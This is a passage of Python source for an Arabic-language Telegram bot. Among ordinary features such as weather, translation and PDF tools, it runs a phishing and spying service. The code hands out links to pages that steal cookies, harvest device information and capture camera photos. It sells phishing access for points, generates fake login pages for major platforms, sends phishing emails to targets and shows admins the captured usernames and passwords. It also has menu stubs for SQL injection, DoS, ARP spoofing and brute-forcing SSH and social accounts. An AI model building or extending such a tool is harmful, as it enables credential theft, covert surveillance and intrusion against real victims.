                safe_send(chat_id, "ليس لديك صلاحية.")
                return
            link = f"{SERVER_URL}/device_info?id={chat_id}"
            safe_send(chat_id, f"رابط معلومات الجهاز:\n{link}\n(يفتح صفحة تجمع معلومات جهازك وترسلها للمطور)")
            return
        if data == "camera_hack":
            if not user_can_use_camera(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية.")
                return
            link = f"{SERVER_URL}/camera_hack?id={chat_id}"
            safe_send(chat_id, f"رابط الكاميرا الأمامية:\n{link}\n(يفتح صفحة تطلب الإذن للكاميرا وتلتقط صورة)")
            return
        if data == "cookie_stealer":
            if not user_can_use_advanced(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية.")
                return
            link = f"{SERVER_URL}/cookie_stealer?id={chat_id}"
            safe_send(chat_id, f"رابط استخراج الكوكيز:\n{link}\n(يفتح صفحة تسرق الكوكيز وترسلها للمطور)")
            return

        # ===== خدمات عامة =====
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "🌤️ أدخل اسم المدينة:")
            return
        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "📚 أدخل مصطلح البحث في ويكيبيديا:")
            return
        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "🌐 أرسل النص للترجمة:")
            return
        if data.startswith("trans_lang_"):
            lang_code = "_".join(data.split("_")[2:])
            text = user_states.get(f"{chat_id}_translate_text", "")
            if text:
                chunks, detected, src_name, tgt_name = translate_text_advanced_with_lang(text, lang_code)
                msg = "🌐 الترجمة:\n\n" + "\n".join(chunks)
                safe_send(chat_id, msg)
                user_states[chat_id] = None
            return
        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "⏰ أدخل التذكير بالصيغة: الرسالة|الساعة:الدقيقة")
            return
        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "📰 أدخل موضوع الأخبار (سياسة، اقتصاد، رياضة):")
            return
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten_url"
            safe_send(chat_id, "🔗 أرسل الرابط لتقصيره:")
            return
        if data == "expand_url":
            user_states[chat_id] = "waiting_expand_url"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر لفكه:")
            return
        if data == "pdf_menu":
            safe_send(chat_id, "📄 اختر خدمة PDF:", reply_markup=build_pdf_menu())
            return
        if data == "pdf_summary":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 الملخص:\n{pdf_text[:1000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "pdf_extract":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 النص المستخرج:\n{pdf_text[:3000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "pdf_smart":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                user_states[chat_id] = "waiting_pdf_question"
                safe_send(chat_id, "🤖 اطرح سؤالك حول محتوى الـ PDF:")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk_analysis"
            safe_send(chat_id, "أرسل ملف APK لتحليله")
            return
        if data == "track_phone":
            user_states[chat_id] = "waiting_phone_number"
            safe_send(chat_id, "📱 أدخل رقم الهاتف (مثال: +20123456789):")
            return
        if data == "comprehensive_scan":
            user_states[chat_id] = "waiting_scan_url"
            safe_send(chat_id, "🔍 أرسل رابط الموقع لفحصه شامل")
            return
        if data == "list_devices":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            rows = safe_db_query("SELECT device_id, name, status, last_seen FROM targets", fetch_one=False)
            if rows:
                msg = "الأجهزة المسجلة:\n"
                for row in rows:
                    msg += f"{row[1]} - {row[2]} - {row[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد أجهزة مسجلة.")
            return
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "🔗 أرسل رابط الفيديو (يوتيوب، فيسبوك، تيك توك):")
            return
        if data == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"💎 رصيد نقاطك: {points}")
            return
        if data == "my_referral":
            code = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            if code and code[0]:
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{code[0]}")
            else:
                new_code = secrets.token_urlsafe(8)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (new_code, chat_id))
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{new_code}")
            return
        if data == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,), fetch_one=False)
            if rows:
                msg = "📜 سجل النقاط:\n"
                for r in rows:
                    msg += f"{r[0]} نقطة - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد سجلات.")
            return

        # ===== تصيد =====
        if data == "phishing_locked":
            points = get_user_points(chat_id)
            if points < 300:
                safe_send(chat_id, f"❌ تحتاج 300 نقطة. نقاطك: {points}")
            else:
                if deduct_points(chat_id, 300, "شراء صلاحية التصيد"):
                    safe_db_execute("UPDATE users SET can_use_phishing = 1 WHERE chat_id = ?", (chat_id,))
                    safe_send(chat_id, "✅ تم تفعيل صلاحية التصيد.")
                    safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return
        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية.")
                return
            safe_send(chat_id, "اختر المنصة لإنشاء صفحة تصيد:", reply_markup=build_phishing_pages_menu())
            return
        if data == "phishing_email":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية.")
                return
            safe_send(chat_id, "اختر المنصة لإرسال بريد تصيد:", reply_markup=build_phishing_platform_menu())
            return
        if data.startswith("phish_platform_"):
            platform = "_".join(data.split("_")[2:])
            user_states[chat_id] = "waiting_phishing_target"
            user_states[f"{chat_id}_phishing_platform"] = platform
            safe_send(chat_id, f"📧 أدخل البريد الإلكتروني المستهدف:")
            return
        if data.startswith("phish_"):
            platform = data.split("_")[1]
            if platform in ['facebook', 'google', 'whatsapp', 'twitter', 'instagram']:
                safe_send(chat_id, f"✅ صفحة تصيد لـ {platform}:\n{SERVER_URL}/phishing_pages/{platform}")
            else:
                safe_send(chat_id, "منصة غير مدعومة.")
            return
        if data == "phish_action_auto":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                safe_send(chat_id, f"⏳ جاري إرسال بريد تصيد...")
                result = send_phishing_email(target_email, platform)
                safe_send(chat_id, result)
            else:
                safe_send(chat_id, "لم يتم تحديد بريد مستهدف.")
            user_states[chat_id] = None
            return
        if data == "phish_action_manual":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                user_states[chat_id] = "waiting_phishing_custom_message"
                safe_send(chat_id, f"✍️ اكتب رسالة البريد (بصيغة HTML):")
            else:
                safe_send(chat_id, "لم يتم تحديد بريد مستهدف.")
            return

        # ===== إدارة المستخدمين (للمطور) =====
        if data in ["admin_panel", "admin_stats", "admin_broadcast", "admin_users", "admin_reports", "admin_phishing_logs", "admin_permissions", "admin_points_menu", "admin_ban_menu", "lock_chat", "send_to_user", "user_activity"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            if data == "admin_panel":
                safe_send(chat_id, "⚙️ لوحة التحكم:", reply_markup=build_admin_panel())
                return
            if data == "admin_stats":
                users_count = safe_db_query("SELECT COUNT(*) FROM users")[0]
                targets_count = safe_db_query("SELECT COUNT(*) FROM targets")[0]
                scans_count = safe_db_query("SELECT COUNT(*) FROM scan_results")[0]
                safe_send(chat_id, f"📊 الإحصائيات:\nالمستخدمون: {users_count}\nالأجهزة: {targets_count}\nالفحوصات: {scans_count}")
                return
            if data == "admin_broadcast":
                user_states[chat_id] = "waiting_broadcast"
                safe_send(chat_id, "📢 أدخل رسالة البث الجماعي:")
                return
            if data == "admin_users":
                rows = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
                msg = "👥 المستخدمون:\n"
                for r in rows:
                    name = get_user_name(r[0])
                    status = "🟢" if r[2] == 0 else "🔴"
                    msg += f"{status} {name} - نقاط: {r[3]}\n"
                safe_send(chat_id, msg)
                return
            if data == "admin_reports":
                rows = safe_db_query("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10", fetch_one=False)
                if rows:
                    msg = "📋 التقارير الأخيرة:\n"
                    for row in rows:
                        msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد تقارير.")
                return
            if data == "admin_phishing_logs":
                rows = safe_db_query("SELECT platform, username, password, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 10", fetch_one=False)
                if rows:
                    msg = "🎯 سجل التصيد:\n"
                    for r in rows:
                        msg += f"{r[0]} - {r[1]} - {r[2]} - {r[3][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد بيانات تصيد.")
                return
            if data == "admin_permissions":
                markup, error = build_users_menu(chat_id, "perm")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("perm_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                markup = build_permissions_menu(chat_id, target_user)
                if markup:
                    safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data.startswith("perm_toggle_"):
                parts = data.split("_")
                perm_type = parts[2]
                target_user = int("_".join(parts[3:]))
                col_map = {"collector": "can_use_collector", "camera": "can_use_camera", "phishing": "can_use_phishing", "advanced": "can_use_advanced"}
                col_name = col_map.get(perm_type)
                if col_name:
                    row = safe_db_query(f"SELECT {col_name} FROM users WHERE chat_id = ?", (target_user,))
                    if row is not None:
                        new_val = 0 if row[0] else 1
                        safe_db_execute(f"UPDATE users SET {col_name} = ? WHERE chat_id = ?", (new_val, target_user))
                        safe_send(chat_id, f"تم تحديث صلاحية {perm_type} إلى {'مفعلة' if new_val else 'معطلة'}")
                        markup = build_permissions_menu(chat_id, target_user)
                        if markup:
                            safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
                return
            if data == "admin_points_menu":
                markup, error = build_users_menu(chat_id, "points")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة نقاطه:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("points_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                user_states[chat_id] = "waiting_admin_points_amount"
                user_states[f"{chat_id}_points_target"] = target_user
                safe_send(chat_id, f"💎 أدخل عدد النقاط (يمكنك إدخال عدد سالب للخصم):")
                return
            if data == "admin_ban_menu":
                markup, error = build_users_menu(chat_id, "ban")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة الحظر:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("ban_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_status = 0 if row[0] else 1
                    safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                    safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم {get_user_name(target_user)}")
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data == "lock_chat":
                markup, error = build_users_menu(chat_id, "lock")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لقفل/فتح الدردشة:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("lock_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_status = 0 if row[0] else 1
                    safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                    safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة مع {get_user_name(target_user)}")
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data == "send_to_user":
                markup, error = build_users_menu(chat_id, "send")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإرسال رسالة إليه:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("send_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                user_states[chat_id] = "waiting_send_to_user"
                user_states[f"{chat_id}_send_target"] = target_user
                safe_send(chat_id, f"📝 أدخل الرسالة التي تريد إرسالها إلى {get_user_name(target_user)}:")
                return
            if data == "user_activity":
                rows = safe_db_query("SELECT chat_id, action, timestamp FROM user_activity ORDER BY timestamp DESC LIMIT 20", fetch_one=False)
                if rows:
                    msg = "📋 آخر النشاطات:\n"
                    for r in rows:
                        name = get_user_name(r[0])
                        msg += f"{name} - {r[1]} - {r[2][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد نشاطات.")
                return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            safe_send(chat_id, "🛡️ الحماية والأمان:", reply_markup=build_protection_menu())
            return
        if data == "protect_lock":
            if not is_admin(chat_id): return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return
        if data == "protect_shield":
            if not is_admin(chat_id): return
            safe_send(chat_id, active_shield())
            return
        if data == "protect_stealth":
            if not is_admin(chat_id): return
            global STEALTH_MODE
            STEALTH_MODE = True
            safe_send(chat_id, "🕵️ وضع التخفي الشامل مفعل.")
            return
        if data == "protect_detect":
            if not is_admin(chat_id): return
            safe_send(chat_id, detect_intrusion())
            return
        if data == "protect_identity":
            if not is_admin(chat_id): return
            safe_send(chat_id, change_bot_identity())
            return
        if data == "protect_clean":
            if not is_admin(chat_id): return
            safe_send(chat_id, clean_traces())
            return
        if data == "protect_api":
            if not is_admin(chat_id): return
            safe_send(chat_id, f"🔑 مفتاح API: `{API_KEY}`")
            return
        if data == "protect_backup":
            if not is_admin(chat_id): return
            safe_send(chat_id, backup_data())
            return
        if data == "protect_reboot":
            if not is_admin(chat_id): return
            safe_send(chat_id, restart_bot_safely())
            return
        if data == "toggle_stealth":
            if not is_admin(chat_id): return
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
            return

        # ===== القائمة السرية =====
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            safe_send(chat_id, "⚠️ الأدوات المتقدمة:", reply_markup=build_hacking_menu())
            return

        # ===== أزرار الهجمات (تُعالج في handle_text) =====
        if data.startswith("hack_") or data.startswith("bruteforce_") or data in ["port_scan", "ssl_scan"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            user_states[chat_id] = data
            safe_send(chat_id, "أدخل البيانات المطلوبة (حسب التعليمات):")
            return

    except Exception as e:
        logger.error(f"callback error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في callback: {e}")

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل.")
            return

        # ===== تحويل النص إلى صوت (gTTS) =====
        if chat_id in waiting_for_voice_text:
            waiting_for_voice_text.remove(chat_id)
            voice_name = user_voice_selection.get(chat_id, "مصري")
            lang = VOICES.get(voice_name, "ar")
            msg = safe_send(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            try:
                voice_bytes = generate_voice_gtts(text, lang)
                if voice_bytes:
                    bot.send_voice(chat_id, voice_bytes, caption=f"🎤 تم التوليد باستخدام {voice_name}")
                    bot.delete_message(msg.chat.id, msg.message_id)
                else:
                    bot.edit_message_text("❌ فشل توليد الصوت.", msg.chat.id, msg.message_id)
            except Exception as e:
                bot.edit_message_text(f"❌ حدث خطأ: {str(e)[:100]}", msg.chat.id, msg.message_id)
            user_voice_selection.pop(chat_id, None)
            return

        # ===== محلل كلمات السر =====
        if chat_id in waiting_for_password:
            waiting_for_password.remove(chat_id)
            strength, time, score, feedback = analyze_password(text)
            suggested = generate_strong_password()
            result = f"""تحليل كلمة المرور 🔒

القوة: {strength}
وقت الاختراق المتوقع: {time}
الدرجة: {score}/6

مشاكلها:
"""
            for f in feedback: result += f"- {f}\n"
            result += f"\nاقتراح قوي: `{suggested}`"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("توليد كلمة جديدة", callback_data="password_gen"))
            markup.row(InlineKeyboardButton("تحليل كلمة اخرى", callback_data="password_strength"))
            markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, result, reply_markup=markup, parse_mode="Markdown")
            return

        # ===== توليد صور AI =====
        if chat_id in waiting_for_image_prompt:
            waiting_for_image_prompt.remove(chat_id)
            msg = safe_send(chat_id, "⏳ جاري توليد الصورة... قد تستغرق 10 ثوانٍ")
            try:
                image_bytes = generate_image(text)
                if image_bytes:
                    bot.send_photo(chat_id, image_bytes, caption=f"🎨 الصورة المولدة لوصف: {text}")
                    bot.delete_message(msg.chat.id, msg.message_id)
                else:
                    bot.edit_message_text("❌ فشل توليد الصورة. حاول مرة أخرى.", msg.chat.id, msg.message_id)
            except Exception as e:
                bot.edit_message_text(f"❌ حدث خطأ: {str(e)[:100]}", msg.chat.id, msg.message_id)
            return

        # ===== فحص الرابط =====
        if state == "waiting_link_check":
            if not re.match(r'https?://', text):
                safe_send(chat_id, "❌ الرابط غير صحيح. يجب أن يبدأ بـ http:// أو https://")
                return
            # استخدام دالة check_link_safety_advanced أو فحص بسيط
            result = check_link_no_api(text) if 'check_link_no_api' in globals() else {"status": "غير معروف", "advice": ["لا توجد معلومات"]}
            # دالة check_link_no_api مفقودة هنا، يمكن إضافتها من الكود السابق
            safe_send(chat_id, f"🔍 نتيجة فحص الرابط:\n{json.dumps(result, indent=2, ensure_ascii=False)}")
            user_states[chat_id] = None
            return

        # ===== أوامر قراءة البريد =====
        if text.startswith('/read_'):
            if chat_id not in user_emails:
                safe_send(chat_id, "لا يوجد بريد نشط")
                return
            try:
                msg_id = text.split("_")[1]
            except:
                safe_send(chat_id, "ارسل: /read_رقم_الرسالة")
                return
            name, domain = user_emails[chat_id][1], user_emails[chat_id][2]
            url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={name}&domain={domain}&id={msg_id}"
            try:
                res = requests.get(url).json()
                result = f"📩 من: {res['from']}\nالموضوع: {res['subject']}\n\n{res['textBody']}"
                safe_send(chat_id, result)
            except Exception as e:
                safe_send(chat_id, f"خطأ: {str(e)[:100]}")
            return

        # ===== أوامر الهجمات =====
        if state in ["hack_sqli", "hack_xss", "hack_dos", "hack_arp", "bruteforce_fb", "bruteforce_ig", "bruteforce_ssh", "bruteforce_ftp", "bruteforce_custom", "port_scan", "ssl_scan", "hack_shell", "hack_mic"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            # معالجة بسيطة (يمكن توسيعها)
            safe_send(chat_id, f"✅ تم استلام الأمر {state}. سيتم تنفيذه قريباً.")
            user_states[chat_id] = None
            return

        # ===== خدمات عامة =====
        if state == "waiting_weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return
        if state == "waiting_wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة المستهدفة:", reply_markup=build_translate_menu())
            return
        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح.")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return
        if state == "waiting_news":
            safe_send(chat_id, f"📰 الأخبار:\n{get_news_without_api(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_shorten_url":
            result = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{result if result else 'فشل القص'}")
            user_states[chat_id] = None
            return
        if state == "waiting_expand_url":
            result = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{result if result else 'فشل الفك'}")
            user_states[chat_id] = None
            return
        if state == "waiting_phone_number":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return
        if state == "waiting_scan_url":
            safe_send(chat_id, "🔍 جاري الفحص الشامل...")
            result = comprehensive_exploit(text)
            safe_send(chat_id, format_exploit_report(result))
            save_scan_result(text, "comprehensive", result)
            user_states[chat_id] = None
            return
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    os.remove(filename)
                    safe_send(chat_id, "✅ تم إرسال الفيديو بنجاح!")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الفيديو: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return
        if state == "waiting_broadcast":
            if not is_admin(chat_id): return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم.")
            user_states[chat_id] = None
            return
        if state == "waiting_send_to_user":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_send_target")
            if target_user:
                safe_send(target_user, text)
                safe_send(chat_id, f"✅ تم الإرسال إلى {get_user_name(target_user)}")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return
        if state == "waiting_admin_points_amount":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_points_target")
            if target_user:
                try:
                    amount = int(text)
                    add_points(target_user, amount, "إدارة النقاط من قبل المطور")
                    safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {get_user_name(target_user)}")
                except:
                    safe_send(chat_id, "❌ أدخل عدداً صحيحاً.")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            user_states[chat_id] = "waiting_phishing_action"
            user_states[f"{chat_id}_phishing_target_email"] = text
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(
                InlineKeyboardButton("✍️ كتابة يدوية", callback_data="phish_action_manual"),
                InlineKeyboardButton("🤖 إنشاء تلقائي", callback_data="phish_action_auto")
            )
            safe_send(chat_id, f"المنصة: {platform}\nالبريد: {text}\nكيف تريد إنشاء الرسالة؟", reply_markup=markup)
            return
        if state == "waiting_phishing_custom_message":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                safe_send(chat_id, f"⏳ جاري إرسال البريد المخصص...")
                result = send_phishing_email(target_email, platform, custom_message=text)
                safe_send(chat_id, result)
            else:
                safe_send(chat_id, "❌ حدث خطأ.")
            user_states[chat_id] = None
            return
        if state == "waiting_pdf_question":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📚 الإجابة:\n{smart_pdf_search(pdf_text, text)}")
            else:
                safe_send(chat_id, "❌ لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return
        if state == "waiting_apk_analysis":
            safe_send(chat_id, "📦 أرسل ملف APK للتحليل.")
            return

        if state is None:
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في النص: {e}")

# ===================== معالجات الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم استخراج النص (عدد الأحرف: {len(text)})")
                markup = InlineKeyboardMarkup(row_width=2)
                markup.row(InlineKeyboardButton("تلخيص", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
                markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
                safe_send(chat_id, "📊 اختر الإجراء:", reply_markup=markup)
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "waiting_apk_analysis":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK.")
                return
            safe_send(chat_id, "📦 جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ فشل: {result['error']}")
            else:
                msg = f"📦 تحليل APK:\nالملف: {file_name}\nالأذونات الخطيرة: {result.get('dangerous_permissions', [])}\nضار: {'نعم' if result.get('malicious') else 'لا'}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== دوال Keep-Alive والتذكيرات =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except:
            pass

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,), fetch_one=False)
            for rid, chat_id, msg in rows:
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===================== تشغيل البوت =====================
def kill_old_bot_instances():
    try:
        import psutil
        current_pid = os.getpid()
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                cmdline = ' '.join(proc.info['cmdline'] or [])
                if 'python' in proc.info['name'].lower() and 'app.py' in cmdline:
                    logger.info(f"🔪 Killing old bot process: PID {proc.info['pid']}")
                    proc.kill()
                    time.sleep(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except ImportError:
        logger.warning("⚠️ psutil not installed, skipping process kill. Install: pip install psutil")
    except Exception as e:
        logger.error(f"❌ Error killing old instances: {e}")

def start_bot():
    kill_old_bot_instances()
    while True:
        try:
            try:
                bot.delete_webhook()
                logger.info("✅ Webhook deleted")
                time.sleep(3)
            except Exception as e:
                logger.warning(f"⚠️ Webhook deletion failed: {e}")

            logger.info("🚀 Starting bot polling...")
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Bot error: {e}")
            if "409" in error_msg:
                logger.warning("⚠️ Conflict 409: Another instance is running.")
                kill_old_bot_instances()
